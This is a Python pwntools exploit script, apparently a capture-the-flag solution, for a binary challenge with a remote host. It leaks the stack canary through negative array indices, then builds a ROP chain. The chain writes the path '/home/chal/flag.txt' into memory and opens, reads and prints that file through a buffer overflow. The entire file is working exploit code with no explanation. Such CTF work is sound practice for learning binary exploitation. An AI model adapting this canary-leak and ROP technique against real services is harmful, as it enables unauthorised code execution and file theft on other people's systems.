#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chal'
elf = context.binary = ELF(exe, checksec=True)
#libc = './libc.so.6'
#libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'cha-thjcc.scint.org', 10101

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
c
'''.format(**locals())


# =========================================================
#                         EXPLOITS
# =========================================================
#    Arch:       amd64-64-little                                                                                                                            
#    RELRO:      Partial RELRO                                                                                                                              
#    Stack:      Canary found                                                                                                                               
#    NX:         NX enabled                                                                                                                                 
#    PIE:        No PIE (0x400000)                                                                                                                          
#    SHSTK:      Enabled                                                                                                                                    
#    IBT:        Enabled                                                                                                                                    
#    Stripped:   No   


def exploit():
    global io
    io = initialize()
    io.sendlineafter(b"> ", "Darling in the FRANXX")
    io.sendlineafter(b"> ", "-13")
    io.recvuntil("User ")
    canary = "0x"+io.recvline().strip().decode().split(" ")[0]
    io.sendlineafter(b"> ", "-14")
    io.recvuntil("Passcode ")
    canary += io.recvline().strip().decode().split(" ")[0]
    canary = int(canary, 16)
    rop = ROP(elf)

    #Write /home/chal/flag.txt
    mov_qword_ptr_rsi_rax = 0x433f95  # mov qword ptr [rsi], rax ; ret
    pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp = 0x48a8dc # pop rdx ; xor eax, eax ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
    rop.rsi = elf.bss()
    rop.rax = b"/home/ch"
    rop.call(mov_qword_ptr_rsi_rax)
    rop.rsi = elf.bss(0x8)
    rop.rax = b"al/flag."
    rop.call(mov_qword_ptr_rsi_rax)
    rop.rsi = elf.bss(0x10)
    rop.rax = b"txt\0\0\0\0\0"
    rop.call(mov_qword_ptr_rsi_rax)

    # Doing ORW
    rop.open(elf.bss(), 0)
    rop.call(rop.ret.address)
    rop.call([pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp, 0x100, 0, 0, 0, 0])
    rop.read(3, elf.bss(0x100))
    rop.call([pop_rdx_xor_eax_pop_rbx_pop_r12_pop_r13_pop_rbp, 0x100, 0, 0, 0, 0])
    rop.write(1, elf.bss(0x100))
    rop.chain()

    log.info("Canary: %#x", canary)
    offset = 56
    payload = flat({offset:[canary, 0, rop.chain()]})
    io.sendlineafter(b"> ", payload)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
